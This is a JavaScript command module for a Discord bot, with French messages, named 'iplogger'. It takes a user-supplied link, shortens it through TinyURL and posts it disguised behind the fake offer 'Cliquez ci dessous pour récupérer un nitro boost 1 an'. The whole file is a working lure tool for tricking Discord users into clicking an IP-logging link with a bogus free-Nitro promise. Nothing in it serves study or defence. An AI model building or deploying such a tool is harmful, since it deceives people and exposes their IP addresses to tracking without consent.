const { EmbedBuilder } = require("@discordjs/builders");
const { SlashCommandBuilder, PermissionsBitField, ModalBuilder, ActionRowBuilder, TextInputStyle, TextInputBuilder } = require("discord.js");
const linkRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;
const fetch = require('node-fetch')

module.exports = {
    name: "iplogger",
    description: "camoufle un lien d'IP Logger.",
    aliases: [],
    permissions: [],
    guildOwnerOnly: false,
    botOwnerOnly: false,
    async execute(client, message, args) {
        const nolink = new EmbedBuilder()
            .setColor(0x2B2D31)
            .setDescription("`❌` Veuillez me donner un lien valide")

        if (!args[0] || !linkRegex.test(args[0])) return message.channel.send({embeds: [nolink]})

        fetch('https://tinyurl.com/api-create.php?url=' + args[0])
            .then(res => res.text())
            .then(data => message.channel.send(`[**Cliquez ci dessous pour récupérer un nitro boost 1 an**](<${data}>)\n\`[**Cliquez ci dessous pour récupérer un nitro boost 1 an**](<${data}>)\``))
            .catch(err => console.log(err));

    },
    async executeSlash(client, interaction) {
        const lien = interaction.options.getString("lien")

        const nolink = new EmbedBuilder()
            .setColor(0x2B2D31)
            .setDescription("`❌` Veuillez me donner un lien valide")

    if (!linkRegex.test(lien)) return interaction.reply({embeds: [nolink]})

    fetch('https://tinyurl.com/api-create.php?url=' + lien)
        .then(res => res.text())
        .then(data => interaction.reply({content: `[**Cliquez ci dessous pour récupérer un nitro boost 1 an**](<${data}>)\n\`[**Cliquez ci dessous pour récupérer un nitro boost 1 an**](<${data}>)\``, ephemeral: true}))
        .catch(err => console.log(err));

    },
    get data() {
        return new SlashCommandBuilder()
            .setName(this.name)
            .setDescription(this.description)
            .addStringOption(o => o.setName("lien").setDescription("le lien à cacher").setRequired(true))
    }
}